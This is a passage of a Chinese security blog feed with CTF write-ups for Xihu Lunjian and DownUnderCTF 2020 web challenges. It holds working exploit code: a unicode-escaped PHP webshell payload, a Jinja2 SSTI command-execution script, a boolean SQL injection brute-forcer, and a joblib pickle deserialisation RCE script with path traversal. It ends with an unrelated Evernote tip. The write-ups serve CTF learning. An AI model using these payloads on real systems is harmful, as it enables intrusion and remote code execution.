file_put_contents($filename,$filecontent.<span class="hljs-string">&quot;\n Powered By Dbapp OSS.&quot;</span>);<br>&#125;<span class="hljs-keyword">elseif</span>($action == <span class="hljs-string">&quot;reset&quot;</span>)&#123;<br>    $files = scandir($sandbox);<br>    <span class="hljs-keyword">foreach</span>($files <span class="hljs-keyword">as</span> $file) &#123;<br>        <span class="hljs-keyword">if</span>(!is_dir($file))&#123;<br>            <span class="hljs-keyword">if</span>($file !== <span class="hljs-string">&quot;index.php&quot;</span>)&#123;<br>                unlink($sandbox.$file);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Security Check Failed.&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>数据包</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?source=1&amp;action=write&amp;filename=index.php</span> HTTP/1.1<br><span class="hljs-attribute">Host</span>: easyjson.xhlj.wetolink.com<br><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<br><span class="hljs-attribute">Cache-Control</span>: max-age=0<br><span class="hljs-attribute">X-Forwarded-For</span>: 127.0.0.1<br><span class="hljs-attribute">X-Originating-IP</span>: 127.0.0.1<br><span class="hljs-attribute">X-Remote-IP</span>: 127.0.0.1<br><span class="hljs-attribute">X-Remote-Addr</span>: 127.0.0.1<br><span class="hljs-attribute">Content-Length</span>: 191<br><br>&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;\u003c\u003f\u0070\u0068\u0070\u0020\u0024\u005f\u0047\u0045\u0054\u005b\u0030\u005d\u0028\u0024\u005f\u0047\u0045\u0054\u005b\u0031\u005d\u0029\u003b\u003f\u003e&quot;&#125;<br></code></pre></td></tr></table></figure><p>参考教程：</p><ol><li>西湖论剑初赛Web1/5：<a href="https://guokeya.github.io/post/qKqMPs-ml/">https://guokeya.github.io/post/qKqMPs-ml/</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2020年9月DownUnderCTF</title>
    <link href="/2020/09/30/2020%E5%B9%B49%E6%9C%8830%E6%97%A5-DownUnderCTF/"/>
    <url>/2020/09/30/2020%E5%B9%B49%E6%9C%8830%E6%97%A5-DownUnderCTF/</url>
    
    <content type="html"><![CDATA[<p>官方 writeup 地址：<a href="https://github.com/DownUnderCTF/Challenges_2020_public">https://github.com/DownUnderCTF/Challenges_2020_public</a><br>题目地址：<a href="https://play.duc.tf/challenges">https://play.duc.tf/challenges</a></p><hr><a id="more"></a><h1 id="Web-Badmin（DNS配置）"><a href="#Web-Badmin（DNS配置）" class="headerlink" title="Web Badmin（DNS配置）"></a>Web Badmin（DNS配置）</h1><p>题目：web badmin</p><p>提示：We launched a game and now it is no longer launched :( can you figure out what happened plox. HALP</p><p>视频上方：me rn。windows</p><p>注释：<code>&lt;!-- &lt;a href=&quot;https://epicgame.play.duc.tf&quot;&gt;Play our new game here!&lt;/a&gt; --&gt;</code>，注释中的网站无法打开</p><p>beep boop：哔哔声</p><p>没有cookie</p><p>hint：Boss: we are firing you. The game doesn’t even load. Web admin: it was just a simple misconfiguration, i clicked the wrong button 😞</p><p>发现注释中有提示信息，使用浏览器、ping工具、curl工具（几种常用的工具）都没有任何响应，束手无策。</p><p>最后查看题解才知道，无法连接是由于DNS的原因，使用dig、host即可获得flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>host -t txt epicgame.play.duc.tf<br><br>dig epicgame.play.duc.tf TXT         <span class="hljs-comment"># dig 命令主要用来从 DNS 域名服务器查询主机地址信息。</span><br><br></code></pre></td></tr></table></figure><p>在 DNS 协议中有很多的资源协议类型，TXT 属于其中一种。</p><ul><li>A记录 - 保存域的IP地址的记录。</li><li>CNAME记录 - 将一个域或子域转发到另一个域，不提供IP地址。</li><li>MX记录 - 将邮件定向到电子邮件服务器。</li><li>TXT记录 - 允许管理员在记录中存储文本注释。</li><li>NS记录 - 存储DNS条目的名称服务器。</li><li>SRV记录 - 指定特定服务的端口。</li></ul><hr><h1 id="Robotsss（SSTI）"><a href="#Robotsss（SSTI）" class="headerlink" title="Robotsss（SSTI）"></a>Robotsss（SSTI）</h1><p>题目地址：<a href="https://chal.duc.tf:30106/">https://chal.duc.tf:30106/</a><br>Us robot devs use better templates than those stupid humans!</p><p>注册并登陆系统，可以得到两个提示信息。第一个信息暗示 humans.txt 中有其他信息（<code>dirsearch</code> 工具也可以扫到），第二个提示暗示 flag 位于 /s3cr3t_p4th/robot_fl4g.txt。在第一个提示的源码中有一串二进制码，解码可得 humen.txt（二进制转ascii），第二篇文章的二进制解码得 fl4g.txt。</p><p>根据第一个暗示我们找到另一个地址(<a href="https://chal.duc.tf:30106/4dm1n_Cr3ds)%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%E7%BB%99%E5%87%BA%E4%B8%80%E6%AE%B5">https://chal.duc.tf:30106/4dm1n_Cr3ds)，这个地址给出一段</a> admin credit 为 6zMLV46JRp6kAmTs3nx5AG4WJgYeY.</p><p>访问 humen.txt 地址发现一张图片，使用 <code>strings</code> 工具处理图片（<code>binwalk</code>、<code>foremost</code> 都测试过），得到一串二进制码</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><br><span class="hljs-number">011000010110010001101101011010010110111000111010010101000110100001101001011100110010110101001001011100110010110101010100011010000110010100101101010000010110010001101101011010010110111000101101010100000110000101110011011100110111011101101111011100100110010000101101010110000100010000100001</span><br><br></code></pre></td></tr></table></figure><p>解码得到 admin:This-Is-The-Admin-Password-XD!，看上去很像是账号密码。</p><p>使用 admin 账号登陆成功。前几天做了很多命令注入的题目（<code>Python</code>、<code>Java</code>），以为这个题目还是命令注入，最后发现是模版注入。并且还在控制台发现：Werkzeug/0.16.0 Python/3.7.9。</p><p>测试代码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;1+1&#125;&#125;                  =&gt; jinja2 <br>&#x27;a&#x27;&#x27;a&#x27;                   =&gt; shell <br>&#x27;a&#x27;.length               =&gt; js <br>len(&#x27;a&#x27;)                 =&gt; python <br>&#x27;a&#x27;.charAt(0)            =&gt; java<br><br>&#123;&#123;1+1&#125;&#125;                  =&gt; 模版注入<br></code></pre></td></tr></table></figure><p>最后根据漏洞特性构造 exp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    get_para = <span class="hljs-string">&#x27;a=__class__&amp;&amp;b=__mro__&amp;&amp;c=__getitem__&amp;&amp;d=__subclasses__&amp;&amp;e=__init__&amp;&amp;f=__globals__&#x27;</span><br>    <span class="hljs-comment"># get_para = &#x27;&#x27;</span><br>    <span class="hljs-comment"># post_para = input(&#x27;POST:&#x27;)</span><br>    cmd = input(<span class="hljs-string">&#x27;cmd:&#x27;</span>)<br>    post_para = <span class="hljs-string">&quot;&#123;&#123; &#x27;&#x27;|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)(1)|attr(request.args.d)()|attr(request.args.c)(127)|attr(request.args.e)|attr(request.args.f)|attr(request.args.c)(&#x27;popen&#x27;)(&#x27;&quot;</span> + cmd + <span class="hljs-string">&quot;&#x27;)|attr(&#x27;read&#x27;)() &#125;&#125;&quot;</span><br><br>    base_url = <span class="hljs-string">&#x27;https://chal.duc.tf:30106/admin.php?&#x27;</span> + get_para<br><br>    resp = requests.post(<br>        url=base_url,<br>        data=&#123;<br>            <span class="hljs-string">&#x27;user_in&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span> + post_para + <span class="hljs-string">&#x27;&#x27;</span><br>        &#125;,<br>        cookies=&#123;<br>            <span class="hljs-string">&#x27;session&#x27;</span>: <span class="hljs-string">&#x27;.eJwlzjsOwjAMANC7eO5gO4kT9zJV4o9gbemEuDtIrG96bzjyjOsB--u8Y4Pj6bDDGNU4F7EnEkntWEiwhok3CfyJUS_ckigxQ1pxr5pNcxrqIp_K4itqFF02zSZLH73ZQPeCGD2YURZiGaJ1tjXWbEO465wFFTa4rzj_GYLPF1GiLjY.X2bocA.l7FpHpE9qJ_HHpRBtjQGgDwGd0Y&#x27;</span>&#125;<br>    )<br><br>    soup = BeautifulSoup(markup=resp.content, features=<span class="hljs-string">&#x27;lxml&#x27;</span>)<br>    print(<span class="hljs-string">f&#x27;result: <span class="hljs-subst">&#123;soup.find(<span class="hljs-string">&quot;p&quot;</span>).get_text()&#125;</span>&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;-------------------------------------------------------&#x27;</span>)<br><br><br></code></pre></td></tr></table></figure><p>成功 getshell，并得到 flag<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930102222.png"></p><p>官方题解：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/robotssss">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/robotssss</a></p><p>通过题解可知，6zMLV46JRp6kAmTs3nx5AG4WJgYeY 为 <code>base58</code> 编码，可以通过 <code>&#123;&#123; config.items() &#125;&#125;</code> 查看系统配置信息，配置信息中的函数用于暗示该函数可以使用。还可以使用 Jinja 自带的语法（<code>&#123;&#123; getFile("/fl4g.txt") &#125;&#125;</code>）来读取 flag 文件。</p><hr><h1 id="Cookie-Clicker（逻辑漏洞）"><a href="#Cookie-Clicker（逻辑漏洞）" class="headerlink" title="Cookie Clicker（逻辑漏洞）"></a>Cookie Clicker（逻辑漏洞）</h1><ul><li>题目地址：<a href="https://cookie-clicker1.web.app/">https://cookie-clicker1.web.app/</a></li><li>官方题解：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/cookie-clicker/solution.md">https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/cookie-clicker/solution.md</a></li><li>题解地址：<a href="https://github.com/joaofcmb/DownUnderCTF-writeups/tree/master/web/cookie-clicker">https://github.com/joaofcmb/DownUnderCTF-writeups/tree/master/web/cookie-clicker</a></li></ul><p>Click da cookie and you get to increase da cookie. Built this using epic Firebase. Built this in a day HOW COOL is firebase! Didn’t need to worry about security because it’s all handled by Google :) just click cookies and enjoy</p><p>WriteUp：我从题目中提取到的关键词是 epic Firebase，Flag 可能和 Firebase 有关。将相关简单流程操作了一下，并未发现异常情况（看了一下请求参数，太复杂了）。题目中还涉及 Google，心生敬畏之心，简单查看源文件之后果断放弃（这种大型网站从来没做过。</p><p>查看题解过后发现第一步的思路是正确的，但是没有去搜索 Firebase。Firestore 是一个数据库服务，并且 WriteUp 提到「Firebase 有一个关键的安全问题——设置访问控制，否则任意用户都能访问数据」。</p><blockquote><p>note：大型服务商（Google）提供的服务通常的问题都出在配置问题。（不然早就修复了</p></blockquote><p>然后观察题目发送的请求（注意观察存在关键词的请求），第一次请求和后面的请求不相同，通常应该联想到第一次请求是在申请授权。按照 <a href="https://firebase.google.com/docs/firestore/use-rest-api">Cloud Firestore API</a> 的教程，使用申请授权的信息向 Firebase 进行验证即可得到 flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>curl -H <span class="hljs-string">&quot;Authorization:Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjczNzVhZmY3MGRmZTNjMzNlOTBjYTM2OWUzYTBlZjQxMzE3MmZkODIiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vY29va2llLWNsaWNrZXIxIiwiYXVkIjoiY29va2llLWNsaWNrZXIxIiwiYXV0aF90aW1lIjoxNjAwNjE1MDYzLCJ1c2VyX2lkIjoiRXVhUkdDU2t0R040Nnh0MWdBRUgzbEw5MkFyMSIsInN1YiI6IkV1YVJHQ1NrdEdONDZ4dDFnQUVIM2xMOTJBcjEiLCJpYXQiOjE2MDA2MTgzNjYsImV4cCI6MTYwMDYyMTk2NiwiZW1haWwiOiJrZWt3QGtla3cua2VrdyIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJrZWt3QGtla3cua2VrdyJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.cHgPEFjfZ0J408lkrRfow_3iIsiLYTd1EVIP28NSvj9ZQIKdY6sZtIJ7XPpeVCcxWcswx9tv4Ftv6uNkgF67HeAccyY7I9YwDQuhWrPIAGMNBbQ2qoq19YbpfLy_Ot-0LRE8z9jpPL8uwEDyy8vX_PPPZAmcFHX3nQe1ltvMWDLGVeIUP4F-tDtHX5NGL-UngGPvEAg6qfpzY5tax6NzPwi-HDRDLHLPa4ayiQurwAw2hs0CTOwvbMDjf8YzoNeL0fscukyOPsFZOw-0L0nQbO4FF0GdfZLLski4VvD0XK8N9lkc_Vtn0cqZ1bN3f7Sof28KAvNf5Is-_JnO6fxz1g&quot;</span> <span class="hljs-string">&quot;https://firestore.googleapis.com/v1/projects/cookie-clicker1/databases/(default)/documents/cookies&quot;</span><br><br></code></pre></td></tr></table></figure><p>官方的 writeup 则是使用 firestore 在源码中搜索能找到登陆的关键凭证，但后面的步骤就很难联想到。（这个题脑洞是真滴大</p><hr><h1 id="CicleSpace（SQL注入）"><a href="#CicleSpace（SQL注入）" class="headerlink" title="CicleSpace（SQL注入）"></a>CicleSpace（SQL注入）</h1><ul><li>题目链接：<a href="https://chal.duc.tf:30103/">https://chal.duc.tf:30103/</a></li><li>题解链接：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/circlespace/writeup.md">https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/circlespace/writeup.md</a></li></ul><p>Oh, how I miss /r/place and /r/circleoftrust. That’s why I decided to create my own one for y’all to play with.<br>/* some bruteforce may be required */</p><p>猜测为SQL注入，但是没有成功注入。发送空数据时，返回报错（400）。</p><p>查看题解后发现，fuzz SQL注入时，最好把自己写入的参数删掉（参数为空）。参考题解的 payload，添加名为 1 的 Person，然后再分别使用：<code>1&quot; AND 1=0  #</code>，<code>1&quot; AND 1=1  #</code> 进行查询，即可发现为 Boolean 注入，然后使用 Boolean 注入的方法进行爆破即可。（使用 <code>2&quot; # </code> 也能查出来）</p><blockquote><p>细心一点测试，这个题应该能做（</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>CHARSET = list(string.ascii_lowercase + string.digits) + [<span class="hljs-string">&#x27;\\_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>]<br>CHARSET_CASE_SENSITIVE = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + [<span class="hljs-string">&#x27;\\_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>]<br><br>BASE_URL = <span class="hljs-string">&quot;http://localhost:5000&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">url: str, sql: str, result: list, charset=CHARSET, current=<span class="hljs-string">&quot;&quot;</span></span>):</span><br>    found = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> charset:<br>        r = s.get(url, params=&#123;<span class="hljs-string">&quot;name&quot;</span>: sql.format(current + i + <span class="hljs-string">&quot;%&quot;</span>)&#125;)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;is not part&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:<br>            found = <span class="hljs-literal">True</span><br>            res = query(url, sql, result, charset=charset, current=current + i)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> res:<br>                result.append(current + i)<br>    <span class="hljs-keyword">return</span> found<br>      <br>s = requests.Session()<br><span class="hljs-comment"># create a circle</span><br>r = s.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;BASE_URL&#125;</span>/create&quot;</span>, data=&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;lol&quot;</span>&#125;)<br>circle_url = r.url<br><br><span class="hljs-comment"># find the right table</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_tables</span>():</span><br>    q = <span class="hljs-string">&#x27;&quot; AND 1=0 UNION SELECT 1 FROM information_schema.tables WHERE table_type=&quot;BASE TABLE&quot; AND table_schema=&quot;circlespace&quot; AND table_name LIKE &quot;&#123;&#125;&quot; -- a&#x27;</span><br>    tables = []<br>    query(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;circle_url&#125;</span>/people&quot;</span>, q, tables)<br>    <span class="hljs-keyword">return</span> tables<br><br>print(get_tables())<br><br></code></pre></td></tr></table></figure><hr><h1 id="Taking-Stock（Python序列化）"><a href="#Taking-Stock（Python序列化）" class="headerlink" title="Taking Stock（Python序列化）"></a>Taking Stock（Python序列化）</h1><p>题目地址：<a href="https://chal.duc.tf:30104/">https://chal.duc.tf:30104/</a></p><p>After taking one unit of AI at uni I’m now a pro. My linear regression model is amazing at predicting the stock market. I’m so proud of it I’m even offering it as a service. Can’t wait to get that VC money!</p><p>题解链接：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/taking-stock">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/taking-stock</a></p><p>登陆后可以发现，Profile Picture 泄漏了 uuid。解码 session 后获得 <code>&#123;&quot;id&quot;:&quot;74795b25-010e-4fca-9e7b-ae05a000d089&quot;,&quot;username&quot;:&quot;1&quot;&#125;_q?G??&#39;1v8aF??j?????&gt;p?4</code>。和图片的 uuid（<code>&lt;img src=&quot;/profile-picture/74795b25-010e-4fca-9e7b-ae05a000d089&quot; alt=&quot;Profile Picture&quot;&gt;</code>） 相同。</p><p>在 stock 位置有目录穿越，也就意味着 joblib 反序列时，可以指定为自己上传的文件。</p><p>基本思路：构建 payload（命令执行结果写回文件） -&gt; 命令序列化后存入文件 -&gt; 将文件做为头像传入系统 -&gt; 在 stock 处反序列化上传的文件 -&gt; 读取头像。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> base64 <span class="hljs-keyword">as</span> b64<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> joblib<br><span class="hljs-keyword">import</span> io<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">base64Padding</span>(<span class="hljs-params">data</span>):</span><br>    missing_padding = <span class="hljs-number">4</span> - len(data) % <span class="hljs-number">4</span><br>    <span class="hljs-keyword">if</span> missing_padding:<br>        data += <span class="hljs-string">&#x27;=&#x27;</span> * missing_padding<br>    <span class="hljs-keyword">return</span> data<br><br>REMOTE = <span class="hljs-string">&#x27;https://chal.duc.tf:30104/&#x27;</span><br>session = requests.Session()<br><br><span class="hljs-comment"># 1. 登陆</span><br>resp = session.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/login&#x27;</span>, data=&#123;<br>    <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;hacker&#x27;</span><br>&#125;)<br><br><span class="hljs-comment"># 2。 获取 Cookie</span><br>token = json.loads(<br>    b64.b64decode(base64Padding(session.cookies[<span class="hljs-string">&#x27;session&#x27;</span>].split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>])).decode()<br>)<br>uid = token[<span class="hljs-string">&#x27;id&#x27;</span>]<br><br>resp = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/profile-picture/<span class="hljs-subst">&#123;uid&#125;</span>&#x27;</span>)<br><br>remote_path = resp.text.split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">-1</span>].replace(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;uid&#125;</span>.png&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).rstrip(<span class="hljs-string">&#x27;/&#x27;</span>)<br><span class="hljs-comment"># print(remote_path)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_payload</span>(<span class="hljs-params">cmd</span>):</span><br>    payload = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;cmd&#125;</span> &gt; <span class="hljs-subst">&#123;remote_path&#125;</span>/<span class="hljs-subst">&#123;uid&#125;</span>.png&#x27;</span><br>    <span class="hljs-comment"># print(payload)</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span>:</span><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>            <span class="hljs-keyword">return</span> (os.system, (payload,))<br><br>    <span class="hljs-keyword">return</span> Model()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exec_cmd</span>(<span class="hljs-params">cmd</span>):</span><br>    <span class="hljs-comment"># 将 payload 序列化后写入文件。</span><br>    tmpfile = io.BytesIO()<br>    joblib.dump(make_payload(cmd), tmpfile)<br>    tmpfile.seek(<span class="hljs-number">0</span>)<br>    <br>    <span class="hljs-comment"># session 上传文件</span><br>    resp = session.post(<br>        url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/profile-picture&#x27;</span>,<br>        files=&#123;<br>            <span class="hljs-string">&#x27;img&#x27;</span>: (<span class="hljs-string">&#x27;1.png&#x27;</span>, tmpfile)<br>        &#125;<br>    )<br>    <br>    <span class="hljs-comment"># 定位问题的位置</span><br>    <span class="hljs-keyword">assert</span> resp.ok<br>    <br>    <span class="hljs-comment"># 使运行文件中序列化的命令</span><br>    resp = session.post(<br>        url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/predict&#x27;</span>,<br>        data=&#123;<br>            <span class="hljs-string">&#x27;stock&#x27;</span>: <span class="hljs-string">&#x27;../&#x27;</span> * <span class="hljs-number">16</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;remote_path&#125;</span>/<span class="hljs-subst">&#123;uid&#125;</span>.png&#x27;</span>,<br>            <span class="hljs-string">&#x27;prices&#x27;</span>: <span class="hljs-string">&#x27;1,2&#x27;</span><br>        &#125;<br>    )<br>    <br>    <span class="hljs-comment"># 读取命令执行的结果</span><br>    resp = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;REMOTE&#125;</span>/profile-picture/<span class="hljs-subst">&#123;uid&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> resp.text<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd = input()<br>    print(exec_cmd(cmd))<br>    print(<span class="hljs-string">&#x27;----------------------------&#x27;</span>)<br><br></code></pre></td></tr></table></figure><hr><h1 id="Design-COMP"><a href="#Design-COMP" class="headerlink" title="Design COMP"></a>Design COMP</h1><p>题目链接：<a href="https://chal.duc.tf:30105/">https://chal.duc.tf:30105/</a></p><p>Come join our homepage design competition and test out your CSS skills!<br>Snippet of admin code: <a href="https://gist.github.com/uint0/21e677a7daf177f115486b9f952037da">https://gist.github.com/uint0/21e677a7daf177f115486b9f952037da</a></p><p>题解链接：<a href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/design-comp">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/design-comp</a></p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决印象笔记粘贴代码缩进混乱的问题</title>
    <link href="/2020/09/30/2020%E5%B9%B49%E6%9C%8830%E6%97%A5-%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/09/30/2020%E5%B9%B49%E6%9C%8830%E6%97%A5-%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>从网页中粘贴代码到印象笔记经常会出现缩进失效.</p><a id="more"></a><ul><li><p>使用 Ctrl + V 直接进行粘贴的结果。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930095549.png"></p></li><li><p>先粘贴到 VScode，再复制 vscode 中的代码进行粘贴(可是我不想再打开 vscode)<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930095611.png"></p></li><li><p>使用 Alfred 的剪贴板，得到的结果和 vscode 相同。</p></li></ul>]]></content>
    
    
    <categories>
      
